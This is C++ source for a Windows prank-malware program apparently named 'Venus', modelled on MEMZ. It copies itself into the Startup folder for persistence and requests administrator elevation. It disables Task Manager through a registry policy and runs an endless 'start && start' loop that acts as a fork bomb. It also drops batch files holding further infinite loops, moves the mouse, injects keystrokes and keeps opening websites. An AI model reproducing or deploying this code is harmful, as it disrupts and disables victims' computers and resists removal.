#include <iostream>
#include <windows.h>
#include <vector>
#include <cstdlib>
#include <ctime>
#include<stdlib.h>
#include <fstream>
#include <string>
#include <winuser.h>

std::vector<std::string> websites({
    "https://github.com/Dfmaaa/MEMZ-virus",
    "https://www.youtube.com/c/PirateSoftware", 
    "https://www.twitch.tv/piratesoftware",
    "https://github.com/Trintonique/Venus",
    "https://en.wikipedia.org/wiki/Kevin_Mitnick",
    "https://store.steampowered.com/app/420530/OneShot/",
    "https://www.youtube.com/watch?v=M88H5eTtGEo",
    //"https://rule34.xxx/index.php?page=post&s=list&tags=doki_doki_literature_club",
    "https://www.google.com/search?client=avast-a-1&q=how+2+buy+weed&oq=how+2+buy+weed",
    "https://store.steampowered.com/app/720250/Welcome_to_the_Game_II/",
    "https://huniepop.fandom.com/wiki/Venus",
    "https://www.google.com/search?q=bitcoin+price",
    "https://store.steampowered.com/app/1150690/OMORI/",
    "https://steamunlocked.net/",
    "https://www.google.com/search?q=Linux+vs+Windows",
    "https://www.torproject.org",
    "https://www.kali.org/",
    "https://www.google.com/search?client=avast-a-1&q=What+is+my+ip",
    "https://store.steampowered.com/app/312520/Rain_World/"
});

std::vector<std::string> fileNames({
    "Ayy lmao.txt",
    "Hello everybody my name is markiplier.txt",
    "What is up my cranky crew.txt",
    "LOVE-LETTER-FOR-YOU.TXT",
    "MEMZ.bat",
    "Dog.txt",
    "Help.txt",
    "010101000101001001001001010011100101010001001111.txt",
    "Google en passant.txt",
    "-|.txt"
});

std::vector<std::string> fileContents({
    "👽👽👽",
    "And welcome back to...",
    "",
    "",
    "@echo off\ncolor a\ncls\n:top\nstart\ngoto top\n",
    "                                  .-.\n     (___________________________()6 `-,\n     (   ______________________   /''\"`\n     //\\\\                      //\\\\\n     \"\" \"\"                     \"\" \"\"",
    "Hello!?\nCan you hear me!!?\nI've been trapped here for a long time... or maybe it hasn't been a long time I don't know!!!\nI'm in a place called \"The Waiting Room\"\nIt's some kind of fucked up place where they kidnap people then torture them for public viewing on the deep web\nI managed to get my hands on the kidnappers computer\nI'm at these coordinates:\n\n41°03'51.4\"N 71°52'37.7\"W\n\nPlease hurry!!!",
    "0101011001000101010011100101010101010011",
    "🐎",
    "Bait used to be believeable"
});

std::vector<WORD> keyCodes({
    0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51,
    0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
    0x38, 0x08, 0x09, 0x0D, 0x14, 0x1B, 0x20, 0x24, 0x25, 0x26, 0x27, 0x28, 0x28, 0xDE, 0xDC, 0xBF, 0xBA
});

char *userPath = getenv("HOMEPATH");

void openWebsites() {
    int websiteTimer = 120;
    int i = websites.size();
    while(true) {
        int randomNumber = rand() % i;
        Sleep(static_cast<DWORD>(websiteTimer * 1000));
        ShellExecuteA(0, 0, websites[randomNumber].c_str(), 0, 0, SW_SHOW);
        if(websiteTimer >= 10) {
            websiteTimer -= 4;
        }
    }
}

void moveMouse() {
    double pixNum = 0; // Number of pixels the mouse moves in any direction, increases over time
    POINT pos;
    while(true) {
        GetCursorPos(&pos);
        int mouseNum = rand() % 8 + 1;
        switch(mouseNum) {
            case 1:
                SetCursorPos(pos.x, pos.y + pixNum);
                break;
            case 2:
                SetCursorPos(pos.x + pixNum, pos.y + pixNum);
                break;
            case 3:
                SetCursorPos(pos.x + pixNum, pos.y);
                break;
            case 4:
                SetCursorPos(pos.x + pixNum, pos.y - pixNum);
                break;
            case 5:
                SetCursorPos(pos.x, pos.y - pixNum);
                break;
            case 6:
                SetCursorPos(pos.x - pixNum, pos.y - pixNum);
                break;
            case 7:
                SetCursorPos(pos.x - pixNum, pos.y);
                break;
            case 8:
                SetCursorPos(pos.x - pixNum, pos.y + pixNum);
                break;
        }
        int maxPix = 8;
        if(pixNum <= maxPix) {
            pixNum += 0.004;
        }
        Sleep((pixNum >= maxPix) ? 25 : 50); // If pixNum is greater than or equal to maxPix, sleep for 25, otherwise sleep for 50
    }
}

void createFiles(int fileTimer, int minTimer) {
    while(true) {
        int fileNum = rand() % fileNames.size();
        std::ofstream(std::string(userPath) + "\\Desktop\\" + std::string(fileNames[fileNum])) << fileContents[fileNum] << std::endl;
        Sleep(fileTimer);
        if(fileTimer <= minTimer) {
            fileTimer -= 2;
        }
    }
}

void startupCopy() {
    std::string startupDiro = "" + std::string(userPath) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"";
    char buffer[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, buffer);
    std::string driveLetter = std::string(buffer).substr(0, 2);
    std::string venusPath = "\"" + std::string(buffer) + "\\Venus.exe\"";
    std::string copyCommand = "copy " + venusPath + " \"" + driveLetter + startupDiro;
    system(copyCommand.c_str());
}

std::wstring stringToWString(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.length(), NULL, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.length(), &wstr[0], size_needed);
    return wstr;
    /*
    I have no idea what this function does I had to use ChatGPT this was really complicated for honestly no reason it's not doing a whole lot lmao
    */
}

void loopFile() {
    char buffer[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, buffer);
    std::string driveLetter = std::string(buffer).substr(0, 2);
    std::string venusAppDiro = driveLetter + std::string(userPath) + "\\AppData\\Local\\Venus";
    std::wstring venusAppDiroW = stringToWString(venusAppDiro);
    CreateDirectoryW(venusAppDiroW.c_str(), NULL);
    std::ofstream(std::string(userPath) + "\\AppData\\Local\\Venus\\venus");
}

void molest() {
    while(true) {
        system("start && start");
    }
}

void requestElevation() {
    char filePath[MAX_PATH];
    GetModuleFileNameA(NULL, filePath, MAX_PATH);

    SHELLEXECUTEINFOA shExecInfo = {0};
    shExecInfo.cbSize = sizeof(SHELLEXECUTEINFOA);
    shExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shExecInfo.hwnd = NULL;
    shExecInfo.lpVerb = "runas";
    shExecInfo.lpFile = filePath;
    shExecInfo.lpParameters = "";
    shExecInfo.lpDirectory = NULL;
    shExecInfo.nShow = SW_SHOWNORMAL;
    shExecInfo.hInstApp = NULL;
    ShellExecuteExA(&shExecInfo);
}

void randomKeys() {
    INPUT ip;
    ip.type = INPUT_KEYBOARD;
    ip.ki.wScan = 0;
    ip.ki.time = 0;
    ip.ki.dwExtraInfo = 0;
    int keyTimer = 1500;
    int minTimer = 50;
    while(true) {
        int varation = rand() % 3;
        int randomKey = rand() % keyCodes.size();
        ip.ki.wVk = keyCodes[randomKey];
        ip.ki.dwFlags = 0;
        SendInput(1, &ip, sizeof(INPUT));
        if(varation == 0) {
            Sleep(keyTimer);
        }
        else if(varation == 1) {
            Sleep(keyTimer * 2);
        }
        else if(varation == 2) {
            Sleep(keyTimer / 2);
        }
        if(keyTimer > minTimer) {
            keyTimer -= 5;
        }
        else {
            keyTimer = minTimer;
        }
        std::cout << keyTimer << std::endl;
    }
}
void lockTaskManager(bool Lock) {
HKEY hkey;
DWORD dwDisposition;
DWORD dwType, dwSize;
DWORD value;

if (Lock)
 value = 1;
else
 value = 0;
if(RegCreateKeyEx(HKEY_CURRENT_USER,
   TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\system"),
   0,
   NULL,
   0,
   KEY_SET_VALUE,
   NULL,
   &hkey,
   &dwDisposition)== ERROR_SUCCESS)
{ 
 dwType = REG_DWORD;
 dwSize = sizeof(DWORD);
 RegSetValueEx(hkey, TEXT("DisableTaskMgr"), 0, dwType, (PBYTE)&value, dwSize);   
 RegCloseKey(hkey);
}
}
